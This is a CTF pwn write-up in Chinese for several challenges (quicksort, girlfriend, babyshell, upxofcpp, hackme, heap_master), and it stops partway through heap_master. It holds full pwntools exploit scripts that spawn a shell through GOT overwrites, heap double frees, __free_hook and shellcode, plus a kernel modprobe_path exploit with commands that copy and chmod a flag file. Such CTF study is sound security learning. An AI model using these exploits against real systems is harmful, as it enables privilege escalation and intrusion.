## Pwn

### Quick sort

```
// file
quicksort: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a19eef0b6e1b24933c02b5bdaafd25c9fa4b9570, stripped

// checksec
[*] '/tmp/quicksort'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`gets()` 可以控制 stack，hijack pointer 任意寫，並且因為沒有 PIE + partial RELRO，所以可以改寫 `free_got` 避免 `free()` 的時候 pointer invalid，而透過改寫為 `main()`，在之後印出結果時也可以透過控制 ptr 來 leak libc。而第二次執行 `main()` 時，再用一樣的方式將 `system()` 寫入 `atoi()`，最後輸入 `/bin/sh` 即可 call `system("/bin/sh")`。

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

# r = process("./Q", env={"LD_PRELOAD": "./libc.so.6"}, aslr=False)
r = process("./Q", env={"LD_PRELOAD": "./libc.so.6"})
# gdb.attach(r, """
# # gets
# b *0x8048901

# # scanf
# # b *0x80488bd
# """)

_main = 0x8048816
__stack_chk_fail_got = 0x804a024
_free_got = 0x0804a018
_stderr = 0x804a060
_atoi_got = 0x804a038

r.sendlineafter('how many numbers do you want to sort?', '3')
r.sendlineafter(' number:', str(_main).encode().ljust(0x2c-0x1c, b'\x00') + p32(3) + p32(0)*2 + p32(_free_got))
r.sendlineafter(' number:', str(0).encode().ljust(0x2c-0x1c, b'\x00') + p32(2) + p32(4)*2 + p32(_stderr))

r.recvuntil('Here is the result:\n')
libc = int(r.recvuntil(' ', drop=True)) - 0x1b2cc0
_system = libc + 0x3ada0
info(f"libc: {hex(libc)}")
info(f"_system: {hex(_system)}")

r.sendlineafter('how many numbers do you want to sort?', '3')
r.sendlineafter(' number:', str(_system).encode().ljust(0x2c-0x1c, b'\x00') + p32(3) + p32(0)*2 + p32(_atoi_got))
r.sendlineafter('the 2th number:', '/bin/sh')

r.interactive()
```



- 主要 bypass canary 的方式有 3 種
  - leak canary
  - 直接 edit return address
  - overwrite `__stack_chk_fail`



### girlfriend

```
// file
chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e9b944287c56358a36334280ccb71ab0ab12ac3b, stripped

// checksec
[*] '/home/u1f383/tmp/pwn/pwn-girlfriend/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

glibc 2.29，tcache 已經加上 key 的保護。

可以 double free，但是沒辦法 edit，因此只能用在 fastbin，以下為 `malloc_hook` 寫 `realloc`，`realloc_hook` 寫 oneshot 版本的 exploit，但是因為條件不合沒辦法使用:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process("./C", env={"LD_PRELOAD": "./libc-2.29.so"}, aslr=False)
r = process("./C", env={"LD_PRELOAD": "./libc-2.29.so"})
gdb.attach(r, """
dir /usr/src/glibc/glibc-2.27/:dir /usr/src/glibc/glibc-2.27/malloc/
b *exec_comm+1761
""")

"""
1.Add a girl's info
2.Show info
3.Edit info
4.Call that girl!
5.Exit lonely.
"""

def add(s, name, call):
    r.sendlineafter('Input your choice:', '1')
    r.sendlineafter('Please input the size of girl\'s name\n', str(s))
    r.sendafter('please inpute her name:\n', name)
    r.sendafter('please input her call:\n', call)

def show_info(idx):
    r.sendlineafter('Input your choice:', '2')
    r.sendlineafter('Please input the index:\n', str(idx))

def call(idx):
    r.sendlineafter('Input your choice:', '4')
    r.recvuntil('Be brave,speak out your love!\n')
    r.sendlineafter('Please input the index:\n', str(idx))
        
add(0x410, "A", "A") # 0
add(0x60, "B", "B") # 1, prevent consolidate
call(0)
show_info(0) # leak libc
r.recvuntil('name:\n')
libc = u64(r.recvuntil('phone:', drop=True).ljust(8, b'\x00')) - 0x3b1ca0
libc &= 0xffffffffffff
oneshot = libc + 0xdf991 # 0xc224f, 0xdf991, 0xdf99d
__malloc_hook = libc + 0x3b1c30
__libc_realloc = libc + 0x80ef0
target = __malloc_hook - 0x13
info(f"libc: {hex(libc)}")

for i in range(2, 10): # 2 - 9
    add(0x60, f"{i}", f"{i}")

call(1)
for i in range(2, 8):
    call(i)

call(8)
call(9)
call(8)

for i in range(10, 17): # 10 - 16
    add(0x60, f"{i}", f"{i}")

add(0x60, p64(target), 'C')
add(0x60, 'D', 'D')
add(0x60, 'E', 'E')
add(0x60, b'\xff'*0xb + p64(oneshot) + p64(__libc_realloc), 'F')
r.sendlineafter('Input your choice:', '1')

r.interactive()
```



再來是 `free_hook()` 比較保險的版本，原本以為 `__free_hook` 上下都是 0，沒辦法透過 `malloc()` 拿到正確的位置，不過在 `_IO_stdfile_0_lock+8`，也就是 `free_hook` 上方剛好有一個 libc address，`0x7f` 的開頭可以利用，而 [[House Of Roman](https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#introduction)](https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc) 是利用 unsorted bin attack 來在 `free_hook` 上方寫 libc address。不過如果 tcache 已經被清空，而 fastbin 還有 chunk 的情況下，fastbin 的 chunk 會被丟回去 tcache，也因此避免掉 chunk size 的限制，以下為該段程式碼

```c
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
		{
		  mchunkptr tc_victim;

		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count
			 && (tc_victim = *fb) != NULL)
		    {
		      if (SINGLE_THREAD_P)
			*fb = tc_victim->fd;
		      else
			{
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx);
		    }
		}
#endif
```



而最後的 exploit 如下:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process("./C", env={"LD_PRELOAD": "./libc-2.29.so"}, aslr=False)
r = process("./C", env={"LD_PRELOAD": "./libc-2.29.so"})
gdb.attach(r, """
dir /usr/src/glibc/glibc-2.27/:dir /usr/src/glibc/glibc-2.27/malloc/
b *exec_comm+1761
""")

"""
1.Add a girl's info
2.Show info
3.Edit info
4.Call that girl!
5.Exit lonely.
"""

def add(s, name, call):
    r.sendlineafter('Input your choice:', '1')
    r.sendlineafter('Please input the size of girl\'s name\n', str(s))
    r.sendafter('please inpute her name:\n', name)
    r.sendafter('please input her call:\n', call)

def show_info(idx):
    r.sendlineafter('Input your choice:', '2')
    r.sendlineafter('Please input the index:\n', str(idx))

def call(idx):
    r.sendlineafter('Input your choice:', '4')
    r.recvuntil('Be brave,speak out your love!\n')
    r.sendlineafter('Please input the index:\n', str(idx))
        
add(0x410, "A", "A") # 0
add(0x60, "B", "B") # 1, prevent consolidate
call(0)
show_info(0) # leak libc
r.recvuntil('name:\n')
libc = u64(r.recvuntil('phone:', drop=True).ljust(8, b'\x00')) - 0x3b1ca0
libc &= 0xffffffffffff
__free_hook = libc + 0x3b38c8
_system = libc + 0x41c30
info(f"libc: {hex(libc)}")

for i in range(2, 10): # 2 - 9
    add(0x60, f"{i}", f"{i}")

call(1)
for i in range(2, 8):
    call(i)

call(8)
call(9)
call(8)

for i in range(10, 17): # 10 - 16
    add(0x60, f"{i}", f"{i}")

add(0x60, p64(__free_hook), 'C') # 17
add(0x60, 'D', 'D') # 18
add(0x60, '/bin/sh\x00', 'E') # 19
add(0x60, p64(_system), 'F')
call(19)

r.interactive()
```



### baby shell

```
// file
starctf_2019_babyshell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1823c3a487a33936129f5630bc72aae96a129ca8, stripped

// checksec
[*] '/home/u1f383/tmp/pwn/babyshell/starctf_2019_babyshell'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

第一個 shellcode 需要為 null，而使用 `add XXX` instruction 就可以繞過，exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./babyshell')
gdb.attach(r, """
b *0x4008cb
""")

ptr = 0x601060
# add byte ptr [rax+0x601060], ah
sc = b'\x00\xa0`\x10`\x00'
sc += asm("""
mov rax, 0x68732f6e69622f
push rax
mov rax, 0x3b
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
""")
r.sendafter('give me shellcode, plz:\n', sc)

r.interactive()
```



### upxofcpp

```
// file
chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=086b20bf8a2c24df642c0642bd3aa5999f90dd7d, stripped

// checksec
[!] Did not find any GOT entries
[*] '/home/u1f383/tmp/pwn/pwn-upxofcpp/upxofcpp'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    Packer:   Packed with UPX
```

可以發現 check 顯示的 `Packer` 為 UPX，而 UPX 有提供 unpack 的功能 `upx -d <binary>`，解完後的到原真正的 binary:

```
// checksec
[*] '/home/u1f383/tmp/pwn/pwn-upxofcpp/upxofcpp'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

pseudo code:

```c++
banner();

while (true) {
	cout << "1. Add a vec" << endl;
    cout << "2. Remove a vec" << endl;
    cout << "3. Edit a vec" << endl;
    cout << "4. Show a vec" << endl;
    cout << "Your choice:" << endl;
    cin >> choice;

    switch (choice): {
        case 1:
            add_1420();
            break;
        case 2:
            remove_1670();
            break;
        case 3:
            edit_1730(); // not implement
            break;
        case 4:
            show_17F0();
            break;
        default:
            cout << "bye bye" << endl;
            return 0;
    }   
}

void add_1420() {
    cout << "Index:";
    cin >> idx;
    
    if (idx > 0xf || vec_list[idx]) {
        return;
    }
    cout << "Size:";
    cin >> size;
    if (size > 0x10000) return;
    
    // Vec {remove_func_list, memory, size}
    Vec vec = new Vec{off_202db8, malloc(4*size), size};
    idx = 0;
    while (idx < vec->size) {
        cin >> integer;
        *(vec->memory + idx*4) = integer;
        idx++;
    }
    
    vec_list[vec_cnt++] = vec;
}

void remove_1670() {
    cout << "vec index:";
    cin >> idx;
    if (idx > 0xf || !vec_list[idx]) {
        cout << "Invalid vec index!" << endl;
    } else {
        func_ptr = *(*vec_list[idx]->remove_func_list + 1);
        if (func_ptr == 0x1dd0) {
            func_ptr(vec_list[idx]->memory);
        } else {
            func_ptr(vec_list[idx]); // not clear ptr
        }
    }
}

void show_17f0() {
    cout << "vec index:";
    cin >> idx;
    if (idx > 0xf || !vec_list[idx]) {
        cout << "Invalid vec index!" << endl;
    } else {
        func_ptr = *(*vec_list[idx] + 0x10);
        if (func_ptr == 0x1e20) {
			cout << "No leakage! :P" << endl;
        } else {
            func_ptr();
        }
    }
}
```



特定版本 + 特定作業系統的 UPX 會讓 heap 變得**可執行 (no NX)**，但是我 local 實際執行 heap 並不會可執行 (環境必須要是 ubuntu16.04 + upx 3.92，參考 [issue](https://github.com/upx/upx/issues/81))。此題參考 [balsn 的 writeup](https://balsn.tw/ctf_writeup/20190427-*ctf/#upxofcpp)，原本有發現 **double free 的問題**，但是沒辦法好好地控制 function table，而 balsn 的解法是透過 function table 以 fastbin 的 fd 一步步找到 function code，而 function pointer 最後會指向第一個 chunk 的末 8 bytes，就可以執行 shellcode:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./U', env={"LD_PRELOAD": "./libc-2.23.so"})
r = process('./U', env={"LD_PRELOAD": "./libc-2.23.so"}, aslr=False)
# r = remote('localhost', 9999)
# gdb.attach(r, """
# # remove_1670
# # b *0x5555555556d0
# # b *0x5555555556c0
# # b *0x555555769c50
# """)

def add(idx, size):
    r.sendlineafter('choice:', '1')
    r.sendlineafter('Index:', str(idx))
    r.sendlineafter('Size:', str(size))

def show(idx):
    r.sendlineafter('choice:', '4')
    r.sendlineafter('index:', str(idx))

def remove(idx):
    r.sendlineafter('choice:', '2')
    r.sendlineafter('index:', str(idx))

info(f"heap_from: {hex(0x555555769c10)}")

payload = asm("xchg rsi, rax ; push rax ; pop rdi ; syscall").ljust(8, b'\x00')
print(payload)
print(hex((u32(payload[:4]))))
print(hex((u32(payload[4:]))))

add(3, 6)
for _ in range(4):
    r.sendline(str(0x33333333))
r.sendline(str(u32(payload[:4])))
r.sendline(str(u32(payload[4:])))

add(0, 10)
for _ in range(10):
    r.sendline(str(0x44444444))

add(1, 10)
for _ in range(10):
    r.sendline(str(0x55555555))

add(2, 10)
for _ in range(10):
    r.sendline(str(0x66666666))

remove(0)
remove(1)
remove(2)
input()
show('2')

sleep(1)
r.send(b'\x90'*0x10 + asm(shellcraft.sh()))

r.interactive()
```



- asm 中，jmp instruction 的寫法為 `jmp .+0x10`

- fastbin consolidate 會由 `malloc_consolidate()` 來完成，call `malloc_consolidate()` 有一些條件 (glibc 2.31):

- 1. large bin request 時

     ```c
     // _int_malloc()
        /*
          If this is a large request, consolidate fastbins before continuing.
          While it might look excessive to kill all fastbins before
          even seeing if there is space available, this avoids
          fragmentation problems normally associated with fastbins.
          Also, in practice, programs tend to have runs of either small or
          large requests, but less often mixtures, so consolidation is not
          invoked all that often in most programs. And the programs that
          it is called frequently in otherwise tend to fragment.
        */
     
       else
         {
           idx = largebin_index (nb);
           if (atomic_load_relaxed (&av->have_fastchunks))
             malloc_consolidate (av);
         }
     ```

  2. atomic ops

     ```c
     // _int_malloc()
     	/* When we are using atomic ops to free fast chunks we can get
              here for all block sizes.  */
           else if (atomic_load_relaxed (&av->have_fastchunks))
             {
               malloc_consolidate (av);
               /* restore original bin index */
               if (in_smallbin_range (nb))
                 idx = smallbin_index (nb);
               else
                 idx = largebin_index (nb);
             }
     ```

  3. fastbin threshold

     ```c
     // _int_free()
     	/*
           If freeing a large space, consolidate possibly-surrounding
           chunks. Then, if the total unused topmost memory exceeds trim
           threshold, ask malloc_trim to reduce top.
     
           Unless max_fast is 0, we don't know if there are fastbins
           bordering top, so we cannot tell for sure whether threshold
           has been reached unless fastbins are consolidated.  But we
           don't want to consolidate on each free.  As a compromise,
           consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD
           is reached.
         */
     
         if ((unsigned long)(size) >= FASTBIN_CONSOLIDATION_THRESHOLD) {
           if (atomic_load_relaxed (&av->have_fastchunks))
     	malloc_consolidate(av);
     
      /*
        FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()
        that triggers automatic consolidation of possibly-surrounding
        fastbin chunks. This is a heuristic, so the exact value should not
        matter too much. It is defined at half the default trim threshold as a
        compromise heuristic to only attempt consolidation if it is likely
        to lead to trimming. However, it is not dynamically tunable, since
        consolidation reduces fragmentation surrounding large chunks even
        if trimming is not used.
      */
     #define FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)
     ```



### pwn-hackme

start.vm.sh

```bash
#! /bin/sh
qemu-system-x86_64 \
    -m 256M \
    -nographic \
    -kernel bzImage \
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \
    -monitor /dev/null \
    -initrd initramfs.cpio \
    -smp cores=4,threads=2 \
    -cpu qemu64,smep,smap 2>/dev/null
```

透過 user 傳入的 `Operation`，在 kernel 中 `create`、`read`、`write`、`delete` pool entry，而 `Operation` 的結構如下:

```c
typedef struct _Operation {
    unsigned int index;
    unsigned int unused;
    char *buf;
    long int size;
    long int off;
} Operation;
```

然而在 kernel module 在做 `read` 與 `write` 的時候，對 `size` 以及 `off` 的檢查如下:

```c
// write
      if ( v8_buf && v17_ope.off + v17_ope.size <= (unsigned __int64)v9_entry_addr->size )
      {
        copy_from_user(&v8_buf[v17_ope.off], v17_ope.buffer, v17_ope.size);
        return 0LL;
      }

// read
        if ( v17_ope.off + v17_ope.size <= (unsigned __int64)v5->size )
        {
          copy_to_user(v17_ope.buffer, &v4[v17_ope.off], v17_ope.size);
          return 0LL;
        }
```

並沒有檢查 `off` 以及 `size` 的型態應該要是 `unsigned long int`，因此如果 `off` 為負數，就可以往回讀取資料。

而在 `kmalloc()` 時使用的 flag 如下:

```c
v16_buffer = _kmalloc(v17_ope.size, 0x6000C0LL);
// (___GFP_IO | ___GFP_FS | ___GFP_ACCOUNT | ___GFP_THISNODE)
// ___GFP_THISNODE: Allocate node-local memory only

// /linux/gfp.h
// flag
/* Plain integer GFP bitmasks. Do not use this directly. */
#define ___GFP_DMA		0x01u
#define ___GFP_HIGHMEM		0x02u
#define ___GFP_DMA32		0x04u
#define ___GFP_MOVABLE		0x08u
#define ___GFP_RECLAIMABLE	0x10u
#define ___GFP_HIGH		0x20u
#define ___GFP_IO		0x40u
#define ___GFP_FS		0x80u
#define ___GFP_ZERO		0x100u
#define ___GFP_ATOMIC		0x200u
#define ___GFP_DIRECT_RECLAIM	0x400u
#define ___GFP_KSWAPD_RECLAIM	0x800u
#define ___GFP_WRITE		0x1000u
#define ___GFP_NOWARN		0x2000u
#define ___GFP_RETRY_MAYFAIL	0x4000u
#define ___GFP_NOFAIL		0x8000u
#define ___GFP_NORETRY		0x10000u
#define ___GFP_MEMALLOC		0x20000u
#define ___GFP_COMP		0x40000u
#define ___GFP_NOMEMALLOC	0x80000u
#define ___GFP_HARDWALL		0x100000u
#define ___GFP_THISNODE		0x200000u
#define ___GFP_ACCOUNT		0x400000u
#ifdef CONFIG_LOCKDEP
#define ___GFP_NOLOCKDEP	0x800000u
#else
#define ___GFP_NOLOCKDEP	0
#endif

#define __GFP_DMA	((__force gfp_t)___GFP_DMA)
#define __GFP_HIGHMEM	((__force gfp_t)___GFP_HIGHMEM)
#define __GFP_DMA32	((__force gfp_t)___GFP_DMA32)
#define __GFP_MOVABLE	((__force gfp_t)___GFP_MOVABLE)  /* ZONE_MOVABLE allowed */
#define GFP_ZONEMASK	(__GFP_DMA|__GFP_HIGHMEM|__GFP_DMA32|__GFP_MOVABLE)

#define __GFP_RECLAIMABLE ((__force gfp_t)___GFP_RECLAIMABLE)
#define __GFP_WRITE	((__force gfp_t)___GFP_WRITE)
#define __GFP_HARDWALL   ((__force gfp_t)___GFP_HARDWALL)
#define __GFP_THISNODE	((__force gfp_t)___GFP_THISNODE)
#define __GFP_ACCOUNT	((__force gfp_t)___GFP_ACCOUNT)

// user interface
#define GFP_ATOMIC	(__GFP_HIGH|__GFP_ATOMIC|__GFP_KSWAPD_RECLAIM)
#define GFP_KERNEL	(__GFP_RECLAIM | __GFP_IO | __GFP_FS)
#define GFP_KERNEL_ACCOUNT (GFP_KERNEL | __GFP_ACCOUNT)
#define GFP_NOWAIT	(__GFP_KSWAPD_RECLAIM)
#define GFP_NOIO	(__GFP_RECLAIM)
#define GFP_NOFS	(__GFP_RECLAIM | __GFP_IO)
#define GFP_USER	(__GFP_RECLAIM | __GFP_IO | __GFP_FS | __GFP_HARDWALL)
#define GFP_DMA		__GFP_DMA
#define GFP_DMA32	__GFP_DMA32
#define GFP_HIGHUSER	(GFP_USER | __GFP_HIGHMEM)
#define GFP_HIGHUSER_MOVABLE	(GFP_HIGHUSER | __GFP_MOVABLE)
#define GFP_TRANSHUGE_LIGHT	((GFP_HIGHUSER_MOVABLE | __GFP_COMP | \
			 __GFP_NOMEMALLOC | __GFP_NOWARN) & ~__GFP_RECLAIM)
#define GFP_TRANSHUGE	(GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM)
```

而後要透過 `read` + negative offset 來 leak kernel，首先 create 5 個 chunk:

```c
    create_entry(0, payload, 0x100);
    create_entry(1, payload, 0x100);
    create_entry(2, payload, 0x100);
    create_entry(3, payload, 0x100);
    create_entry(4, payload, 0x100);
    remove_entry(1);
    remove_entry(3); // ptr->fd = chunk_1
```

heap address 必須透過 chunk 的 fd 來 leak，不過如果相鄰的 chunk 都是 freed，chunk 會受到 consolidate 的影響，因此建立 5 個 chunk + remove chunk 1 跟 chunk3，就可以透過 chunk 4 來 leak chunk 3 指向 chunk 1 的 fd pointer。

而 kernel address 可以透過 chunk 0 讀取 heap 上的 data，因為 kernel 其他的 data 可能會在 heap 上殘留 kernel address，到這邊 kernel 跟 heap 都有了:

```c
    read_data(4, (char *)buf, 0x100, -0x100); // leak heap
    heap = *(ptr);

    read_data(0, (char *)buf, 0x100, -0x100); // leak kernel
    kernel = *(ptr+5);
```

之後要 leak kernel module，並且改 pool table，而先在 pwndbg 看有哪些地方有 kernel module 的 address:

```bash
# 先看已知的 address 處在哪個 mapping region，確保 addr base 相同
pwndbg> xinfo 0xffffffff81849ae0
Extended information for virtual address 0xffffffff81849ae0:

  Containing mapping:
0xffffffff81459000 0xffffffff81c00000 rwxp   7a7000 0      <explored>

# 再從該 region 中找 kernel module 的 address
pwndbg> find 0xffffffff81459000, 0xffffffff81c00000, 0xffffffffc000
0xffffffff81811012
0xffffffff81811022
0xffffffff818403ea
0xffffffff8184713a
0xffffffff81919a92
# 以上 address 即是透過 leaked address 加上 offset 可以得到存放 kernel module address 的 address
```

在 kernel 中，只要能改動 chunk fd，就能拿到任意位置，並且不會有 size header 的限制，因此再次利用 chunk 4 去更改 chunk 3 的 fd 為 `0xffffffff81811010 + 0x30`，+ 0x30 的原因為很明顯在 `0xffffffff81811010` 會有類似 data struct 的資料，而 + 0x30 的位置看起來是 memory map (`main_arena` 的感覺)，對於 memory map entry 的 fd 與 bk 都是指向自己，並且看起來沒用到，因此分配這塊 memory chunk 時不會影響到 kernel 的運作，只要再透過 `read_data()` 即可拿到 -0x30 offset 的 module base。

```c
    unsigned long table_ptr = kernel - 0x38ad0;
    memset(buf, 0, 0x200); // clear buffer
    *ptr = table_ptr + 0x30;

    write_data(4, (char *)buf, 0x100, -0x100);
    create_entry(5, zeros, 0x100);
    create_entry(6, zeros, 0x100);
    read_data(6, (char *)buf, 0x30, -0x30);
    unsigned long module = *(ptr+1);
	unsigned long modprobe_path = kernel - 0xa180;
```

有 kernel, heap, module，下一步要想辦法改寫 pool，使得我們可以多次寫入，寫 `modprobe_path`，而方式還是透過改寫 fd 拿到任意 chunk:

```c
    // remove all entry except 0, 6
    remove_entry(2);
    remove_entry(4);
    remove_entry(5);

    create_entry(1, zeros, 0x100); // 0x700
    create_entry(2, zeros, 0x100); // 0x800
    create_entry(3, zeros, 0x100); // 0x600

    remove_entry(3); // 0x600
    remove_entry(2); // 0x800
    // 0x800 has a fd point to 0x600
    // 0x600 fd point --> 0xffffffff81811040
    
    memset(buf, 0, 0x200); // clear buffer
    *ptr = modprobe_path;
    write_data(1, (char *)buf, 0x100, -0x100);

    create_entry(2, zeros, 0x100);
    create_entry(3, zeros, 0x100);

    memset(buf, 0, 0x200); // clear buffer
    create_entry(4, "/home/pwn/copy.sh\x00", 0x100);
    system("/home/pwn/dummy");
    system("cat /home/pwn/flag");

    close(dev_fd);
```

並在 `main()` 一開始先建立 modprobe path 所需要的檔案:

```c
    puts("[*] create modprobe path file");
    system("echo -ne '#!/bin/sh\ncp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
    system("chmod 777 /home/pwn/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
    system("chmod 777 /home/pwn/dummy");
```

然而，這樣會因為 kernel heap 的結構亂掉，導致 `execve` 執行時會出現 kernel panic，因此必須把 kernel heap 給修好，所以要先拿到 pool table region，透過改寫 pointer，同時修復 heap 以及改寫 `modprobe_path`，不過不確定是否因為 kernel heap 只有一個指向 `modprobe_path` 的 chunk (`buf` 裡面都是 0)，所以讓 heap 不會受影響 (?):

```c
    memset(buf, 0, 0x200); // clear buffer
    ptr[0] = modprobe_path;
    ptr[1] = 0x100;
    create_entry(4, buf, 0x100);
    write_data(1, "/home/pwn/copy.sh\x00", 0x18, 0);
    system("/home/pwn/dummy");
    system("cat /home/pwn/flag");

    close(dev_fd);
```

成功拿到 flag:

```shell
// output
/home/pwn/dummy: line 1: ����: not found
*CTF{userf4ult_fd_m4kes_d0uble_f3tch_perfect}
```

- [參考文章](https://kileak.github.io/ctf/2019/xctf-hackme/)
- 之後會想看其他解法如:
  - [tty_struct](https://balsn.tw/ctf_writeup/20190427-*ctf/#hack_me)
  - [userfault_fd](http://brieflyx.me/2020/linux-tools/userfaultfd-internals/)

P.S. 作者說題目出爛了，應該要有 index boundary checking 的，所以有 **hackme_revenge**



### heap_master

```
// file
./heap_master: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3b9b2fb172a175612c820c4de66a666d6ed0eed6, not stripped

// checksec
[*] '/home/u1f383/tmp/pwn/pwn-heap_master/env/share/heap_master'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

glibc 版本為 2.25。



程式流程十分簡單，首先會建立一塊範圍在 0x10000 ~ 0xFFFFF000 的 0x10000 大小的空間，稱做 `heap_base`，之後有三個功能

- 任意 free `heap_base + offset`
- 任意寫 `heap_offset`
- 任意 `malloc()`

由於沒有 output function，因此需要竄改 stdout 的 `write_ptr` 來 leak libc，而在 glibc 2.25 仍可以使用 **unsorted bin attack** 在指定位置寫入 chunk bin 的 address，步驟為:

1. `a = malloc(0x410)` - 大小只需要能在 free 之後進入 unsorted bin 即可
2. `malloc(0x10)` - 防止 consolidation
3. `a->bk = target_addr - 0x10` - 將第一次 `malloc()` 得到的 chunk bk 改成目標 - 0x10
4. `malloc(0x410)` - 申請與第一次 `malloc()` 時大小相同的 chunk

以下為 unsorted bin attack 關鍵的程式碼:

```c
// malloc/malloc.c
static void *
_int_malloc (mstate av, size_t bytes)
{
    ...
for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
        bck = victim->bk; // <----- bk == target address - 0x10
        ...
		/* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av); // <----- 更改了 target address 的 value

          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
				set_non_main_arena (victim);
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
	...
```

當 `malloc()` 的大小不屬於 fastbin 以及 smallbin，會進入此段程式碼。而程式碼的主要邏輯為，從 unsorted bin 中找尋是否有大小相同的 chunk 可以直接使用，如果有的話就會 return 給 user，而其中會順便清理 unsorted bin，將該歸位到 smallbin 或是 largebin 的 chunk 整理好。不過在更新 unsorted bin 的 linked list 時，沒有特別對 pointer 做檢查，因此如果我們能更動 `victim->bk`，這樣就能在執行 `bck->fd = unsorted_chunks (av);` 時寫入 `bck->fd == victim->bk->fd` unsorted bin 的 address。

而此題的 unsorted bin address 與 `_IO_2_1_stdout_` 只有末 2 bytes 有差別，因此只要 partial overwrite 原本的 freed chunk 的 bk，就有 1/16 的機率可以猜到 `_IO_2_1_stdout_->_IO_write_ptr` 的位置並做改寫。然而，由於 `new_do_write` 中的判斷式 `  else if (fp->_IO_read_end != fp->_IO_write_base)` 成立時會直接 return，所以沒辦法 leak libc。

```c
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base) // <---- match this condition and return
    {
      _IO_off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
```



在此情況下，是否能透過改變 `stdout` 指向我們能控制的 fake `_IO_2_1_stdout_`?

**以下參考 [balsn writeup](https://balsn.tw/ctf_writeup/20190427-*ctf/#heap-master)**



建構 fake `_IO_2_1_stdout_` 前，由於 member 會有多個 libc address，因此利用構造多個 fake chunk of smallbin，並且 `free` 完後會有 smallbin 的 address，這樣就能有 libc address 來構造 fake `_IO_2_1_stdout_`:

```python
for i in range(0xe):
    edit(0xf8 + i*0x10, p64(0x201))
for i in range(0x10):
    edit(0x2f8 + i*0x10, p64(0x21))
for i in range(0xd):
    free(0x1d0-i*0x10)
    malloc(0x1f0)
```

這邊要 `malloc()` 的原因在於，chunk 必須從 smallbin 中取走，不然 smallbin 的 chunk 串起來時 chunk 的 fd 或 bk 會變成 `mmap()` address，並且做 `unlink` 時會因為 `prev_size` (0x200) 不等於 `chunksize(P)` (0x20) 而壞掉:

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
    ...
	if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
		unlink(av, nextchunk, bck, fwd);
		size += nextsize;
      } 
     ...
}

